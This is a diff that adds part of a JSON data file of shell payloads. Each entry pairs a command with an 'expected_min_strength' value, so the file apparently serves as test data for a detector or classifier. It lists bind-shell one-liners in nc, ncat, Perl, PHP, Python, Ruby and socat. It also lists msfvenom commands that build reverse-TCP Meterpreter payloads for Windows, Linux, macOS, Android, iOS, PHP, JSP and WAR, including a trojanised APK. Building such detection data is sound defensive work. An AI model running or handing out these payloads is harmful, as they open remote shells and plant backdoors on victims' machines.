+    "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "ncat -e Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux"
+   ],
+   "lines": [
+    "ncat -nlvp 4444 -e /bin/sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Perl Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux"
+   ],
+   "lines": [
+    "perl -e 'use Socket;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux",
+    "windows"
+   ],
+   "lines": [
+    "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",4444);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "Python3 Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux",
+    "windows"
+   ],
+   "lines": [
+    "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",4444));s1.listen(1);c,a=s1.accept();",
+    "while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Ruby Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux"
+   ],
+   "lines": [
+    "ruby -rsocket -e 'f=TCPServer.new(9001); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec \"/bin/sh -i\"'"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "Socat (TTY) Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux"
+   ],
+   "lines": [
+    "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Meterpreter Staged Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "staged",
+    "meterpreter",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f exe -o reverse.exe"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f exe -o reverse.exe"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Staged Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "staged",
+    "meterpreter",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/x64/shell/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f exe -o reverse.exe"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Stageless Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f exe -o reverse.exe"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Staged JSP Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "staged",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f jsp -o ./rev.jsp"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Staged ASPX Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "staged",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f aspx -o reverse.aspx"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Staged ASPX Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "staged",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f aspx -o reverse.aspx"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Linux Meterpreter Staged Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "linux",
+    "meterpreter",
+    "staged",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f elf -o reverse.elf"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Linux Stageless Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "linux",
+    "meterpreter",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f elf -o reverse.elf"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows Bind TCP ShellCode - BOF",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "bind",
+    "bufferoverflow"
+   ],
+   "lines": [
+    "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\u0000' -f python -v notBuf -o shellcode"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "macOS Meterpreter Staged Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "mac",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f macho -o shell.macho"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "mac",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f macho -o shell.macho"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "macOS Stageless Reverse TCP (x64)",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "mac",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p osx/x64/shell_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f macho -o shell.macho"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP Meterpreter Stageless Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "linux",
+    "meterpreter",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p php/meterpreter_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f raw -o shell.php"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP Reverse PHP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "linux",
+    "meterpreter",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p php/reverse_php LHOST=203.0.113.7 LPORT=4444 -o shell.php"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "JSP Stageless Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "linux",
+    "meterpreter",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f raw -o shell.jsp"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "WAR Stageless Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "linux",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p java/shell_reverse_tcp LHOST=203.0.113.7 LPORT=4444 -f war -o shell.war"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Android Meterpreter Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "android",
+    "android",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=203.0.113.7 lport=4444 R -o malicious.apk"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Android Meterpreter Embed Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "android",
+    "android",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost=203.0.113.7 lport=4444 -o payload.apk"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Apple iOS Meterpreter Reverse TCP Inline",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "apple_ios",
+    "apple_ios",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=203.0.113.7 lport=4444 -f macho -o payload"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Python Stageless Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "windows",
+    "linux",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p cmd/unix/reverse_python LHOST=203.0.113.7 LPORT=4444 -f raw"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Bash Stageless Reverse TCP",
+   "section": "MSFVenom",
+   "meta": [
+    "msfvenom",
+    "linux",
+    "macos",
+    "stageless",
+    "reverse"
+   ],
+   "lines": [
+    "msfvenom -p cmd/unix/reverse_bash LHOST=203.0.113.7 LPORT=4444 -f raw -o shell.sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  }
+ ]
+}
